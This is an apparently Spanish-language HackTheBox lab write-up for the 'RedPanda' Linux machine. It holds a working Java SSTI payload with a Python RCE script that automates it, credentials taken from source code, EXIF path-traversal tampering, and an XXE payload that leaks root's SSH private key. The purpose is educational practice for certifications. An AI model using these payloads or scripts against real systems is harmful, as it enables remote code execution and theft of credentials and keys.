---
title: RedPanda | Linux
published: 2025-10-05
image: "./logo.png"
tags: [Easy, Linux, SSTI, RCE, XXE, eWPT, eWPTXv2, OSWE, OSCP]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

-Server Side Template Injection (SSTI)
-SSTI - Bypassing special character restriction
-SSTI - Creation of a Python script to automate java injection (RCE)
-Creating a Bash script for process monitoring with user included
-Abusing log file + Image etadata + XML External Entity Injection (XXE) [Privilege Escalation]

### Preparación

- eWPT
- eWPTXv2
- OSWE
- OSCP

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash wrap=false
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.170 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.11.170`       | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```txt wrap=false
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```bash wrap=false
nmap -sVC -p22,8080 10.10.11.170 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.11.170`       | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```txt wrap=false
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http    Apache Tomcat (language: en)
|_http-title: Red Panda Search | Made with Spring Boot
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Puerto 8080

![RedPanda Search](./1.png)

## Explotación

### SSTI

Vemos que hay un panel de búsqueda que refleja lo que ponemos, si intentamos un `SSTI` de [Java](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md), nos bloqueará por el `$`:

![Banned chars](./2.png)

Sin embargo, nos pone que podemos usar `*` entre otros carácteres, si probamos `*{7*7}`:

![Success SSTI](./3.png)

Si probamos el siguiente payload para intentar un `LFI` vemos lo siguiente:

```java wrap=false
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

![LFI](./4.png)

### Script for RCE

Sabiendo que esto ejecuta comandos, podemos automatizar un script que nos permita un `RCE` de manera sencilla:

```python wrap=false intitle='Créditos a S4vitar, el rey del hacking'
#!/usr/bin/python3

import requests, sys, pdb, signal, os, time

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 2:
    print("\n[!] El programa ha sido ejecutado incorrectamente\n")
    print('[+] Uso: python3 %s "whoami"' % sys.argv[0])
    sys.exit(1)

def makePayload():

    command = sys.argv[1]

    payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % ord(command[0])

    command = command[1:]

    for character in command:
    	payload += ".concat(T(java.lang.Character).toString(%s))" % ord(character)

    payload += ").getInputStream())}"

    return payload

def makeRequest(payload):

    search_url = "http://10.10.11.170:8080/search"

    post_data = {
        'name': payload
    }

    r = requests.post(search_url, data=post_data)

    f = open("output.txt", "w")
    f.write(r.text)
    f.close()

    os.system("cat output.txt | awk '/searched/,/<\\/h2>/' | sed 's/    <h2 class=\"searched\">You searched for: //' | sed 's/<\\/h2>//'")

if __name__ == '__main__':
    payload = makePayload()
    makeRequest(payload)
```

Esto automatiza todo de manera que nos muestra en consola el comando ejecutado:

```bash wrap=false
❯ python3 ssti.py "whoami"
woodenk

❯ python3 ssti.py "id"
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

Si intenramos conseguir una **reverse shell**, no lo conseguiremos de ninguna manera, debe de haber algún firewall o alguna regla que nos lo impide. Enumerando un poco los procesos vemos esto:

```bash wrap=false
root         875  0.0  0.1   6812  2928 ?        Ss   Oct04   0:00 /usr/sbin/cron -f
root         878  0.0  0.1   8356  3340 ?        S    Oct04   0:00  \_ /usr/sbin/CRON -f
root         896  0.0  0.0   2608   596 ?        Ss   Oct04   0:00      \_ /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         897  0.0  0.2   9420  4576 ?        S    Oct04   0:00          \_ sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
woodenk      900  0.1 11.1 3106828 225684 ?      Sl   Oct04   1:54              \_ java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
woodenk    19230  0.0  0.1   9484  3976 ?        R    20:32   0:00                  \_ ps -faux
```

Vemos el directorio `/opt/panda_search`, si hacemos una búsqueda recursiva con el usuario `woodenk`:

```bash wrap=false
❯ python3 ssti.py "grep -r woodenk /opt/panda_search/ 2>/dev/null" | grep -vE "jpg|Binary"
/opt/panda_search/target/classes/templates/stats.html:        &lt;a href=&quot;/stats?author=woodenk&quot;&gt;&lt;p&gt;woodenk&lt;/p&gt;&lt;/a&gt;
/opt/panda_search/src/main/resources/templates/stats.html:        &lt;a href=&quot;/stats?author=woodenk&quot;&gt;&lt;p&gt;woodenk&lt;/p&gt;&lt;/a&gt;
/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java:		if(author.equals(&quot;woodenk&quot;) || author.equals(&quot;damian&quot;))
/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java:		if(author.equals(&quot;woodenk&quot;) || author.equals(&quot;damian&quot;))
/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java:            conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/red_panda&quot;, &quot;woodenk&quot;, &quot;RedPandazRule&quot;);
```

Vemos las credenciales `woodenk:RedPandazRule`:

```bash wrap=false
❯ ssh woodenk@10.10.11.170
The authenticity of host '10.10.11.170 (10.10.11.170)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '10.10.11.170' (ED25519) to the list of known hosts.
woodenk@10.10.11.170's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 05 Oct 2025 08:36:33 PM UTC

  System load:           0.09
  Usage of /:            80.9% of 4.30GB
  Memory usage:          38%
  Swap usage:            0%
  Processes:             212
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.170
  IPv6 address for eth0: dead:beef::250:56ff:fe94:bb95


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul  5 05:51:25 2022 from 10.10.14.23
woodenk@redpanda:~$ whoami
woodenk
woodenk@redpanda:~$ cat user.txt 
fde083462b1183baa...
```

## Escalada de privilegios

```bash wrap=false intitle="procmon.sh"
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
        new_process=$(ps -eo user,command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|diff|kworker"
        old_process=$new_process
done
```

```bash wrap=false
woodenk@redpanda:/tmp$ ./procmon.sh 
> root     /usr/sbin/CRON -f
> root     /usr/sbin/CRON -f
> root     /bin/sh -c sudo -u woodenk /opt/cleanup.sh
> root     /bin/sh -c /root/run_credits.sh
> root     sudo -u woodenk /opt/cleanup.sh
> root     /bin/sh /root/run_credits.sh
> root     java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
> woodenk  /bin/bash /opt/cleanup.sh
> woodenk  /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;
< woodenk  /bin/bash /opt/cleanup.sh
> woodenk  [cleanup.sh] <defunct>
< woodenk  /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;
< root     /usr/sbin/CRON -f
< root     /bin/sh -c sudo -u woodenk /opt/cleanup.sh
< root     sudo -u woodenk /opt/cleanup.sh
< woodenk  [cleanup.sh] <defunct>
```

Vemos algunas tareas tanto de `root` como de `woodenk`, si nos vamos de nuevo a `/opt/panda_search/` vemos algo interesante:

```bash wrap=false
woodenk@redpanda:/opt/panda_search$ ls -la
total 48
drwxrwxr-x 5 root root  4096 Jun 14  2022 .
drwxr-xr-x 5 root root  4096 Jun 23  2022 ..
drwxrwxr-x 3 root root  4096 Jun 14  2022 .mvn
-rwxrwxr-x 1 root root 10122 Jun 14  2022 mvnw
-rw-rw-r-- 1 root root  6603 Feb 21  2022 mvnw.cmd
-rw-rw-r-- 1 root root  2577 Apr 27  2022 pom.xml
-rw-rw-r-- 1 root logs     1 Oct  5 21:28 redpanda.log
drwxrwxr-x 4 root root  4096 Jun 14  2022 src
drwxrwxr-x 9 root root  4096 Jun 22  2022 target
```

El archivo `redpanda.log` es de `root`, si pudiesemos colar algo para escalar privilegios, estaría muy bien. Vamos a ver como se genera este archivo:

```bash wrap=false
woodenk@redpanda:/opt$ grep -r "redpanda.log" 2>/dev/null
Binary file panda_search/target/classes/com/panda_search/htb/panda_search/RequestInterceptor.class matches
panda_search/src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java:        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
Binary file credit-score/LogParser/final/target/classes/com/logparser/App.class matches
credit-score/LogParser/final/src/main/java/com/logparser/App.java:        File log_fd = new File("/opt/panda_search/redpanda.log");
```

Si analizamos el flujo de lo que pasa en ese archivo, veremos que es posible realizar un `XXE`. A continuación cómo lo haremos:

```txt wrap=false title='Flujo del programa'
# Log de imagen en /opt/redpanda_search/redpanda.log
200||10.10.14.15||curl/8.15.0||/img/smiley.jpg

1. Se genera el path -> "/opt/panda_search/src/main/resources/static" + "/img/smiley.jpg" -> uri (Ruta Absoluta)
2. Metadata de la imagen -> Artist -> ../../../../../../tmp/zelpro.jpg -> Para sustituirlo en el siguiente paso
3. "/credits/" + artist + "_creds.xml" -> /credits/../../../../../../tmp/zelpro_creds.xml

Ahora la idea es que como podemos modificar ese xml y root lo va a interpretar, podríamos intentar un XXE para filtrar el id_rsa del usuario root.
```

Vamos a realizar el ataque:

```bash wrap=false intitle='Modificamos los metadatos de la imagen'
❯ exiftool -Artist=../../../../../../tmp/zelpro zelpro.jpg
    1 image files updated
❯ exiftool zelpro.jpg
ExifTool Version Number         : 13.25
File Name                       : zelpro.jpg
Directory                       : .
File Size                       : 200 kB
File Modification Date/Time     : 2025:10:06 21:45:46+02:00
File Access Date/Time           : 2025:10:06 21:45:46+02:00
File Inode Change Date/Time     : 2025:10:06 21:45:46+02:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 1
Y Resolution                    : 1
Resolution Unit                 : None
Artist                          : ../../../../../../tmp/zelpro
Y Cb Cr Positioning             : Centered
Image Width                     : 1080
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1080x1080
Megapixels                      : 1.2
```

```bash wrap=false intitle='Generamos el archivo XML y le damos permisos completos'
woodenk@redpanda:/tmp$ touch zelpro_creds.xml
woodenk@redpanda:/tmp$ chmod 777 zelpro_creds.xml
```

```xml wrap=false intitle='Le asignamos el contenido'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>&xxe;</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>1</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>3</views>
  </image>
  <totalviews>4</totalviews>
</credits>
```

```bash wrap=false intitle='Enviamos la solicitud maliciosa'
curl -s -X GET -A "prueba||/../../../../../../tmp/zelpro.jpg" http://10.10.11.170:8080/
```

```xml wrap=false intitle='Conseguimos el id_rsa'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>[
<credits>
  <author>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</author>
  <image>s
    <uri>/img/greg.jpg</uri>
    <views>1</views>
  </image>i
  <image>s
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>i
  <image>s
    <uri>/img/smooch.jpg</uri>
    <views>0</views>a
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>3</views>
  </image>
  <totalviews>4</totalviews>
</credits>
```

```bash wrap=false intitle='Conseguimos la flag'
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@10.10.11.170
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 06 Oct 2025 08:25:05 PM UTC

  System load:           0.0
  Usage of /:            81.1% of 4.30GB
  Memory usage:          39%
  Swap usage:            0%
  Processes:             218
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.170
  IPv6 address for eth0: dead:beef::250:56ff:fe94:bb95


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jun 30 13:17:41 2022
root@redpanda:~# whoami
root
root@redpanda:~# cat /root/root.txt 
4b9025130d0b2022c0...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/481)

---